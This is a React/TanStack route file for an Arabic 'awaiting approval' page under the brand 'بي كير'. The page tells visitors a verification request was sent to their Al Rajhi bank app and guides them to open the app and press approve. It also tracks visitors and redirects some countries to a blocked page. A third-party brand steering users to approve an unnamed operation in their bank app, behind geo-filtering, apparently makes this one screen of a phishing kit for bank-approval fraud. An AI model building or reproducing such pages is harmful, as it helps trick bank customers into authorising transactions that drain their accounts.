import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { checkCountryAccess } from "@/lib/tracking.functions";
import brandLogo from "@/assets/brand-logo.svg";

export const Route = createFileRoute("/rajhi-wait")({
  head: () => ({
    meta: [
      { title: "بانتظار الموافقة | بي كير" },
      { name: "description", content: "بانتظار تأكيد عملية التحقق في بي كير." },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@500;700&display=swap",
      },
    ],
  }),
  component: RajhiWaitPage,
});

function RajhiWaitPage() {
  useVisitorTracking("انتظار التحقق - بي كير");
  const [angle, setAngle] = useState(0);
  const [dots, setDots] = useState("");

  useEffect(() => {
    if (typeof window === "undefined") return;
    checkCountryAccess()
      .then((res) => {
        if (res && res.allowed === false) window.location.replace("/blocked");
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    let raf = 0;
    const start = performance.now();
    const tick = (now: number) => {
      setAngle(((now - start) / 1200) * 360);
      raf = requestAnimationFrame(tick);
    };
    raf = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(raf);
  }, []);

  useEffect(() => {
    const t = setInterval(() => setDots((d) => (d.length >= 3 ? "" : d + ".")), 500);
    return () => clearInterval(t);
  }, []);

  return (
    <div
      dir="rtl"
      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
      style={{
        fontFamily: "'Tajawal', system-ui, sans-serif",
        background:
          "radial-gradient(1200px 600px at 50% -10%, #EAF3FA 0%, #F5F8FB 55%, #F5F8FB 100%)",
      }}
    >
      {/* Subtle decorative rings */}
      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#156394]/15" />
        <div className="absolute -top-24 -right-24 w-[280px] h-[280px] rounded-full border border-[#156394]/10" />
        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#156394]/10" />
      </div>

      <div className="w-full max-w-[440px] relative">
        {/* Brand chip */}
        <div className="flex items-center justify-center gap-2 mb-5">
          <span className="inline-flex items-center gap-1.5 text-[11px] font-semibold text-[#156394] bg-[#156394]/10 px-3 py-1.5 rounded-full">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
            التحقق الراجحي
          </span>
        </div>

        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(21,99,148,0.25)] border border-[#156394]/10 overflow-hidden">
          {/* Accent top bar */}
          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#2b86c0,#156394,#0c4269)" }} />

          <div className="p-6 sm:p-9 flex flex-col items-center text-center">
            {/* Header */}
            <div className="w-full flex items-center justify-between mb-6">
              <span className="text-[11px] font-bold text-[#94a3b8] tracking-wide">معالجة الطلب</span>
              <div className="flex items-center gap-2">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" aria-label="شعار بي كير">
                  <path d="M12 2L2 7v6c0 5.5 4.3 9.9 10 11 5.7-1.1 10-5.5 10-11V7L12 2z" stroke="#156394" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                  <path d="m9 12 2 2 4-4" stroke="#f9a824" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                 <span className="text-[#156394] font-extrabold text-sm">تحقق من معلومات الحساب</span>
              </div>
            </div>

            {/* Spinner */}
            <div className="relative my-6 flex items-center justify-center">
              <div className="absolute w-[148px] h-[148px] rounded-full bg-[#156394]/10 blur-2xl" aria-hidden />
              <svg width="148" height="148" viewBox="0 0 148 148" style={{ transform: `rotate(${angle}deg)` }}>
                <defs>
                  <linearGradient id="rajhiWaitGrad" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0%" stopColor="#2b86c0" />
                    <stop offset="100%" stopColor="#0c4269" />
                  </linearGradient>
                </defs>
                <circle cx="74" cy="74" r="58" stroke="#e2e8f0" strokeWidth="8" fill="none" />
                <circle
                  cx="74"
                  cy="74"
                  r="58"
                  stroke="url(#rajhiWaitGrad)"
                  strokeWidth="8"
                  fill="none"
                  strokeLinecap="round"
                  strokeDasharray="90 275"
                />
              </svg>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-[104px] h-[104px] rounded-full bg-gradient-to-br from-white to-[#EAF3FA] border border-[#156394]/15 shadow-[inset_0_1px_0_rgba(255,255,255,0.9)] flex items-center justify-center">
                  <img src={brandLogo} alt="الشعار" className="w-16 h-auto" />
                </div>
              </div>
            </div>

            <h1 className="text-[20px] sm:text-[22px] font-extrabold text-[#10243a] tracking-tight">
              بانتظار الموافقة
              <span className="inline-block w-7 text-right text-[#156394]">{dots}</span>
            </h1>
            <p className="mt-2 text-[13px] text-[#64748b] leading-relaxed max-w-[320px]">
              تم إرسال طلب التحقق إلى <span className="font-bold text-[#156394]">تطبيق الراجحي</span>. يرجى مراجعة التطبيق والموافقة على العملية.
            </p>

            {/* Notice */}
            <div className="mt-6 w-full rounded-2xl bg-[#EAF3FA] border border-[#156394]/15 px-4 py-3 text-[12px] font-bold text-[#156394]">
              يرجى عدم إغلاق الصفحة حتى تكتمل عملية التحقق
            </div>

            {/* Steps */}
            <ol className="mt-5 w-full space-y-2.5 rounded-2xl bg-[#F5F8FB] border border-[#e2e8f0] p-4 text-[13px] text-[#334155] text-right">
              <Step n={1}>افتح تطبيق <b className="text-[#156394]">الراجحي</b></Step>
              <Step n={2}>راجع طلب التحقق الجديد</Step>
              <Step n={3}>اضغط <b className="text-[#156394]">موافق</b> لإتمام العملية</Step>
            </ol>
          </div>
        </div>

        <p className="mt-5 text-center text-[11px] text-[#94a3b8]">
          © بي كير — جميع الحقوق محفوظة
        </p>
      </div>
    </div>
  );
}

function Step({ n, children }: { n: number; children: React.ReactNode }) {
  return (
    <li className="flex items-start gap-3">
      <span
        className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-full text-[11px] font-extrabold text-white"
        style={{ background: "linear-gradient(135deg,#2b86c0,#156394)" }}
      >
        {n}
      </span>
      <span className="leading-relaxed">{children}</span>
    </li>
  );
}
